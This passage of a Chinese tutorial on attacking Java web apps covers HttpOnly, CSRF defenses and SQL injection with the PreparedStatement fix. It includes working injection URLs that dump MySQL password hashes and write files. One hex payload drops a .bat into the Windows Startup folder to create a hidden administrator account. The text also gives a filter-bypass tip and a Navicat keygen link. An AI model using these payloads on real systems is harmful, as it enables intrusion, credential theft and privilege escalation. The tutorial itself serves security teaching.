大致的意思是：如果isHttpOnly被设置成true，那么cookie会被标识成HttpOnly.能够在一定程度上解决跨站脚本攻击。 ￼

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517194123712%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

在servlet3.0开始才支持直接通过setHttpOnly设置,其实就算不是JavaEE6也可以在set Cookie的时候加上HttpOnly; 让浏览器知道你的cookie需要以HttpOnly方式管理。而ng a 在新的Servlet当中不只是能够通过手动的去setHttpOnly还可以通过在web.xml当中添加cookie-config(HttpOnly默认开启,注意配置的是web-app\_3\_0.xsd):-


还可以设置下session有效期(30分)：

    <session-timeout>30</session-timeout>

### 0x04 CSRF (跨站域请求伪造)

* * *

CSRF（Cross Site Request Forgery, 跨站域请求伪造）用户请求伪造，以受害人的身份构造恶意请求。(经典解析参考：http://www.ibm.com/developerworks/cn/web/1102\_niugang\_csrf/ )

#### CSRF 攻击的对象

在讨论如何抵御 CSRF 之前，先要明确 CSRF 攻击的对象，也就是要保护的对象。从以上的例子可知，CSRF 攻击是黑客借助受害者的 cookie 骗取服务器的信任，但是黑客并不能拿到 cookie，也看不到 cookie 的内容。另外，对于服务器返回的结果，由于浏览器同源策略的限制，黑客也无法进行解析。因此，黑客无法从返回的结果中得到任何东西，他所能做的就是给服务器发送请求，以执行请求中所描述的命令，在服务器端直接改变数据的值，而非窃取服务器中的数据。所以，我们要保护的对象是那些可以直接产生数据改变的服务，而对于读取数据的服务，则不需要进行 CSRF 的保护。比如银行系统中转账的请求会直接改变账户的金额，会遭到 CSRF 攻击，需要保护。而查询余额是对金额的读取操作，不会改变数据，CSRF 攻击无法解析服务器返回的结果，无需保护。

#### Csrf攻击方式



#### 防御CSRF：

  验证 HTTP Referer 字段
  在请求地址中添加 token 并验证
  在 HTTP 头中自定义属性并验证
  加验证码
  (copy防御CSRF毫无意义，参考上面给的IBM专题的URL)

最常见的做法是加token,Java里面典型的做法是用filter：[https://code.google.com/p/csrf-filter/](https://code.google.com/p/csrf-filter/)(链接由plt提供，源码上面的在：[http://ahack.iteye.com/blog/1900708](http://ahack.iteye.com/blog/1900708))
# 攻击JavaWeb应用、sql注入（上）

**0x01 经典的JDBC的Sql注入**

Sql注入产生的直接原因是拼凑SQL，绝大多数程序员在做开发的时候并不会去关注SQL最终是怎么去运行的，更不会去关注SQL执行的安全性。因为时间紧，任务重完成业务需求就行了，谁还有时间去管你什么SQL注入什么？还不如喝喝茶，看看妹子。正是有了这种懒惰的程序员SQL注入一直没有消失，而这当中不乏一些大型厂商。有的人可能心中有防御Sql注入意识，但是在面对复杂业务的时候可能还是存在侥幸心理，最近还是被神奇路人甲给脱裤了。为了处理未知的SQL注入攻击，一些大厂商开始采用SQL防注入甚至是使用某些厂商的WAF。

#### JDBCSqlInjectionTest.java类：

``` java
package org.javaweb.test;
 
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
 
public class JDBCSqlInjectionTest {
 
    /**
     * sql注入测试
     * @param id
     */
    public static void sqlInjectionTest(String id){
 
        String MYSQLDRIVER = "com.mysql.jdbc.Driver";//MYSQL驱动
        //Mysql连接字符串
        String MYSQLURL = "jdbc:mysql://localhost:3306/wooyun?user=root&password=caonimei&useUnicode=true&characterEncoding=utf8&autoReconnect=true";
        String sql = "SELECT * from corps where id = "+id;//查询语句
        try {
            Class.forName(MYSQLDRIVER);//加载MYSQL驱动
            Connection conn = DriverManager.getConnection(MYSQLURL);//获取数据库连接
            PreparedStatement pstt = conn.prepareStatement(sql);
            ResultSet rs = pstt.executeQuery();
            System.out.println("SQL:"+sql);//打印SQL
            while(rs.next()){//结果遍历
                System.out.println("ID:"+rs.getObject("id"));//ID
                System.out.println("厂商:"+rs.getObject("corps_name"));//输出厂商名称
                System.out.println("主站"+rs.getObject("corps_url"));//厂商URL
            }
            rs.close();//关闭查询结果集
            pstt.close();//关闭PreparedStatement
            conn.close();//关闭数据连接
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (SQLException e) {
            e.printStackTrace();
        }
    }
    public static void main(String[] args) {
        sqlInjectionTest("2 and 1=2 union select version(),user(),database(),5 ");//查询id为2的厂商
    }
}
```

**现在有以下Mysql数据库结构(后面用到的数据库结构都是一样)**

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517164334935%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

看下图代码是一个取数据和显示数据的过程。

第20行就是典型的拼SQL导致SQL注入，现在我们的注入将围绕着20行展开：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517164504551%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

当传入正常的参数”2”时输出的结果正常：-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517164519242%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

当参数为 `2 and 1=1`去查询时，由于1=1为true所以能够正常的返回查询结果：-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517164552844%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

当传入参数`2 and 1=2`时查询结果是不存在的，所以没有显示任何结果。

Tips:在某些场景下可能需要在参数末尾加注释符--,使用“--”的作用在于注释掉从当前代码末尾到SQL末尾的语句。

\--在oracle和mssql都可用，mysql可以用`#` `/**`。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517164623573%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

执行order by 4正常显示数据order by 5错误说明查询的字段数是4

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F2018051716463995%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

Order by 5执行后直接爆了一个SQL异常：-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517164710277%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

用联合查询执行:`2 and 1=2 union select version(),user(),database(),5`

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517164742386%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

#### 小结论：

**通过控制台执行SQL注入可知SQL注入跟平台无关、跟开发语言关系也不大，而是跟数据库有关。** 知道了拼SQL肯定是会造成SQL注入的，那么我们应该怎样去修复上面的代码去防止SQL注入呢？其实只要把参数经过预编译就能够有效的防止SQL注入了，我们已经依旧提交SQL注入语句会发现之前能够成功注入出数据库版本、用户名、数据库名的语句现在无法带入数据库查询了：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517164810801%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

### 0x02 PreparedStatement实现防注入

SQL语句被预编译并存储在PreparedStatement对象中。然后可以使用此对象多次高效地执行该语句。

``` java
Class.forName(MYSQLDRIVER);//加载MYSQL驱动 
Connection conn = DriverManager.getConnection(MYSQLURL);//获取数据库连接 
String sql = "SELECT * from corps where id = ? ";//查询语句 
PreparedStatement pstt = conn.prepareStatement(sql);//获取预编译的PreparedStatement对象 
pstt.setObject(1, id);//使用预编译SQL 
ResultSet rs = pstt.executeQuery();
```


![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517164846106%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)从Class.forName反射去加载MYSQL启动开始，到通过DriverManager去获取一个本地的连接数据库的对象。而拿到一个数据连接以后便是我们执行SQL与事物处理的过程。当我们去调用PreparedStatement的方法如：executeQuery或executeUpdate等都会通过mysql的JDBC实现对Mysql数据库做对应的操作。Java里面连接数据库的方式一般来说都是固定的格式，不同的只是实现方式。所以只要我们的项目中有加载对应数据库的jar包我们就能做相应的数据库连接。而在一个Web项目中如果/WEB-INF/lib下和对应容器的lib下只有mysql的数据库连接驱动包，那么就只能连接MYSQL了，这一点跟其他语言有点不一样，不过应该容易理解和接受，假如php.ini不开启对mysql、mssql、oracle等数据库的支持效果都一样。修复之前的SQL注入的方式显而易见了，`用“？”号去占位，预编译SQL的时候会自动根据pstt里的参数去处理，从而避免SQL注入。`


```
String sql = "SELECT * from corps where id = ? "; 
pstt = conn.prepareStatement(sql);//获取预编译的PreparedStatement对象 
pstt.setObject(1, id);//使用预编译SQL 
ResultSet rs = pstt.executeQuery(); 
```


在通过conn.prepareStatement去获取一个PreparedStatement便会以预编译去处理查询SQL，而使用conn.createStatement得到的只是一个普通的Statement不会去预编译SQL语句，但Statement执行效率和速度都比prepareStatement要快前者是后者的父类。

从类加载到连接的关闭数据库厂商根据自己的数据库的特性实现了JDBC的接口。类加载完成之后才能够继续调用其他的方法去获取一个连接对象，然后才能过去执行SQL命令、返回查询结果集(ResultSet)。

Mysql的Driver：

    public class Driver extends NonRegisteringDriver implements java.sql.Driver{}

在加载驱动处下断点（22行），可以跟踪到mysql的驱动连接数据库到获取连接的整个过程。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517164946968%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517164958556%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517165027731%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

F5进入到Driver类：-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517165044631%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

驱动加载完成后我们会得到一个具体的连接的对象Connection,而这个Connection包含了大量的信息，我们的一切对数据库的操作都是依赖于这个Connection的：-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517165109283%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

`conn.prepareStatement(sql);`

在获取PreparedStatement对象的时进入会进入到Connection类的具体的实现类ConnectionImpl类。

然后调用其prepareStatement方法。 ￼

而nativeSQL方法调用了EscapeProcessor类的静态方法escapeSQL进行转意，返回的自然是转意后的SQL。

预编译默认是在客户端的用`com.mysql.jdbc.PreparedStatement`本地SQL拼完SQL，最终mysql数据库收到的SQL是已经替换了“?”后的SQL，执行并返回我们查询的结果集。 从上而下大概明白了预编译做了个什么事情，并不是用了PreparedStatement这个对象就不存在SQL注入而是跟你在预编译前有没有拼凑SQL语句，-

    String sql = “select * from xxx where id = ”+id//这种必死无疑。

#### Web中绕过SQL防注入：

Java中的JSP里边有个特性直接`request.getParameter("Parameter");`去获取请求的数据是不分GET和POST的，而看过我第一期的同学应该还记得我们的Servlet一般都是两者合一的方式去处理的，而在SpringMVC里面如果不指定传入参数的方式默认是get和post都可以接受到。

SpringMvc如：

```
@RequestMapping(value="/index.aspx",method=RequestMethod.GET)
public String index(HttpServletRequest request,HttpServletResponse response){
    System.out.println("------------");
    return "index";
```

}
上面默认只接收GET请求，而大多数时候是很少有人去制定请求的方式的。说这么多其实就是为了告诉大家我们**可以****通过POST方式去绕过普通的SQL防注入检测！**

#### Web当中最容易出现SQL注入的地方：

常见的文章显示、分类展示。
用户注册、用户登录处。
关键字搜索、文件下载处。
数据统计处（订单查询、上传下载统计等）经典的如select下拉框注入。
逻辑略复杂处(密码找回以及跟安全相关的)。

#### 关于注入页面报错：

如果发现页面抛出异常，那么得从两个方面去看问题，传统的SQL注入在页面报错以后肯定没法直接从页面获取到数据信息。如果报错后SQL没有往下执行那么不管你提交什么SQL注入语句都是无效的，如果只是普通的错误可以根据错误信息进行参数修改之类继续SQL注入。 假设我们的id改为int类型：

    int id = Integer.parseInt(request.getParameter("id")); ￼

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517165249303%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

程序在接受参数后把一个字符串转换成int(整型)的时候发生异常，那么后面的代码是不会接着执行的哦，所以SQL注入也会失败。-

#### Spring中如何安全的拼SQL(JDBC同理)：

对于常见的SQL注入采用预编译就行了，但是很多时候条件较多或较为复杂的时候很多人都想偷懒拼SQL。

写了个这样的多条件查询条件自动匹配：

```

    public static String SQL_FORUM_CLASS_SETTING = "SELECT * from bjcyw_forum_forum where 1=1 ";     public List<Map<String, Object>> getForumClass(Map<String,Object> forum) {
    StringBuilder sql=new StringBuilder(SQL_FORUM_CLASS_SETTING);
    List<Object> ls=new ArrayList<Object>();
    if (forum.size()>0) {
        for (String key : forum.keySet()) {
            Object obj[]=(Object [])forum.get(key);
            sql = SqlHelper.selectHelper(sql, obj);
            if ("like".equalsIgnoreCase(obj[2].toString().trim())) {
                ls.add("%"+obj[1]+"%");
            }else{
                ls.add(obj[1]);
            }
        }
    }
    return jdbcTemplate.queryForList(sql.toString(),(Object[])ls.toArray());
}
selectHelper方法：
public static StringBuilder selectHelper(StringBuilder sql, Object obj[]){
    if (Constants.SQL_HELPER_LIKE.equalsIgnoreCase(obj[2].toString())) {
        sql.append(" AND "+obj[0]+" like ?");
    }else if (Constants.SQL_HELPER_EQUAL.equalsIgnoreCase(obj[2].toString())) {
        sql.append(" AND "+obj[0]+" = ?");
    }else if (Constants.SQL_HELPER_GREATERTHAN.equalsIgnoreCase(obj[2].toString())) {
        sql.append(" AND "+obj[0]+" > ?");
    }else if (Constants.SQL_HELPER_LESSTHAN.equalsIgnoreCase(obj[2].toString())) {
        sql.append(" AND "+obj[0]+" < ?");
    }else if (Constants.SQL_HELPER_NOTEQUAL.equalsIgnoreCase(obj[2].toString())) {
        sql.append(" AND "+obj[0]+" != ?");
    }
    return sql;
}
```

信任客户端的参数一切参数只匹配查询条件，把参数和条件自动装配到框架。

如果客户端提交了危险的SQL也没有关系在query的时候是会预编译。

不贴了原文在：[http://zone.wooyun.org/content/2448](http://zone.wooyun.org/content/2448)

### 0x03 转战Web平台

* * *

看完了SQL注入在控制台下的表现，如果对上面还不甚清楚的同学继续看下面的Web注入。

首先我们了解下Web当中的SQL注入产生的原因:

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517165409422%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

Mysql篇： 数据库结构上面已经声明，现在有以下Jsp页面，逻辑跟上面注入一致：-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517165433389%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

浏览器访问：http://localhost/SqlInjection/index.jsp?id=1-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517165453463%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

上面我们已经知道了查询的字段数是4，现在构建联合查询，其中的1，2，3只是我们用来占位查看字段在页面对应的具体的输出。在HackBar执行我们的SQL注入，查看效果和执行情况：-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517165520927%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

#### Mysql查询和注入技巧：

只要是从事渗透测试工作的同学或者对Web比较喜爱的同学强荐大家学习下SQL语句和Web开发基础，SQL管理客户端有一个神器叫Navicat。支持MySQL, SQL Server, SQLite, Oracle 和 PostgreSQL databases。-
官方下载地址：[http://www.navicat.com/download](http://www.navicat.com/download)不过需要注册，-
|注册机：[http://pan.baidu.com/share/link?shareid=271653&uk=1076602916](http://pan.baidu.com/share/link?shareid=271653&uk=1076602916) 其次是下载吧有全套的下载。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517165544604%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

似乎很多人都知道Mysql有个数据库叫information\_schema里面存储了很多跟Mysql有关的信息，但是不知道里面具体都有些什么，有时间大家可以抽空看下。Mysql的sechema都存在于此，包含了字段、表、元数据等各种信息。也就是对于Mysql来说创建一张表后对应的表信息会存储到information\_schema里面，而且可以用SQL语句查询。

使用Navicat构建SQL查询语句：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517165611734%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

当我们在SQL注入当中找到用户或管理员所在的表是非常重要的，而当我们想要快速找到跟用户相关的数据库表时候在Mysql里面就可以合理的使用information\_schema去查询。构建SQL查询获取所有当前数据库当中数据库表名里面带有user关键字的演示：-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517165644239%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

查询包含user关键字的表名的结果：-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517165659545%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

假设已知某个网站用户数据非常大，我们可以通过上面构建的SQL去找到对应可能存在用户数据信息的表。

查询Mysql所有数据库中所有表名带有user关键字的表，并且按照表的行数降序排列：



查询指定数据库：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517165758404%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

查询字段当中带有user关键字的所有的表名和数据库名：-



![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517165826243%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

#### CONCAT：

    http://localhost/SqlInjection/index.jsp?id=1 and 1=2 union select 1,2,3,CONCAT('MysqlUser:',User,'------MysqlPassword:',Password) FROM mysql.`user` limit 0,1￼

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517165858743%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

#### GROUP\_CONCAT

    http://localhost/SqlInjection/index.jsp?id=1 and 1=2 union select 1,2,3,GROUP_CONCAT('MysqlUser:',User,'------MysqlPassword:',Password) FROM mysql.`user` limit 0,1

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F2018051716592854%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

#### 注入点友情备份:

    http://localhost/SqlInjection/index.jsp?id=1 and 1=2 union select '','',corps_name,corps_url from corps into outfile'E:/soft/apache-tomcat-7.0.37/webapps/SqlInjection/1.txt'

注入在windows下默认是E:\\如果用“\\”去表示路径的话需要转换成`E:\\`而更方便的方式是直接用/去表示即E:/。 当我们知道WEB路径的情况下而又有outfile权限直接导出数据库中的用户信息。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517170023236%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

而如果是在一些极端的情况下无法直接outfile我们可以合理的利用concat和GROUP\_CONCAT去把数据显示到页面，如果数据量特别大，我们可以用concat加上limit去控制显示的数量。比如每次从页面获取几百条数据？写一个工具去请求构建好的SQL注入点然后把页面的数据取下来，那么数据库的表信息也可以直接从注入点全部取出来。

## 注入点root权限提权：-
1、写启动项：

这个算是非常简单的了，直接写到windows的启动目录就行了，我测试的系统是windows7直接写到:C:/Users/selina/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup目录就行了。用HackBar去请求一下链接就能过把bat写入到我们的windows的启动菜单了，不过得注意的是360那个狗兔崽子：

    http://localhost/SqlInjection/index.jsp?id=1 and 1=2 union select 0x6E65742075736572207975616E7A20313233202F6164642026206E6574206C6F63616C67726F75702061646D696E6973747261746F7273207975616E7A202F616464,'','','' into outfile 'C:/Users/selina/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/1.bat'

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F2018051717011173%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

##### 2、失败的注入点UDF提权尝试：

MYSQL提权的方式挺多的，并不局限于udf、mof、写windows启动目录、SQL语句替换sethc实现后门等，这里以udf为例，其实udf挺麻烦的，如果麻烦的东东你都能搞定，简单的自然就能过搞定了 。在进行mysql的udf提权的时候需要注意的是mysql的版本，mysql5.1以下导入到windows目录就行了，而mysql>=5.1需要导入到插件目录。我测试的是Mysql 5.5.27我们的首要任务就是找到mysql插件路径。

    http://localhost/SqlInjection/index.jsp?id=1 and 1=2 union select 1,2,3,@@plugin_dir

获取插件目录方式：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517170207169%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

通过MYSQL预留的变量很轻易的就找到了mysql所在目录，那我们需要把udf导出的绝对路径就应该是：`D:/install/dev/mysql5.5/lib/plugin/udf.dll`。现在我们要做的就是怎样通过SQL注入去把这udf导出到上述目录了。 我先说下我是怎么从错误的方法到正确导入的一个过程吧。首先我执行了这么一个SQL：-

    SELECT * from corps where id = 1 and 1=2 union select '','','',(CONVERT(0xudf的十六进制 ,CHAR)) INTO DUMPFILE 'D:/install/dev/mysql5.5/lib/plugin/udf.dll'

因为在命令行或执行单条语句的时候转换成char去dumpfile的时候是可以成功导出二进制文件的。 我们用浏览器浏览网页的时候都是以GET方式去提交的，而如果我用GET请求去传这个十六进制的udf的话显然会超过GET请求的限制，于是我简单的构建了一个POST请求去把一个110K的0x传到后端。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517170242709%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)用hackbar去发送一个post请求发现失败了，一定是我打开方式不对，呵呵。随手写了个表单提交下：-
下载地址: [http://pan.baidu.com/share/link?shareid=1711769621&uk=1076602916￼](http://pan.baidu.com/share/link?shareid=1711769621&uk=1076602916)-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517170308636%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

提交表单以后发现文件是写进去了，但是为什么就只有84字节捏？-

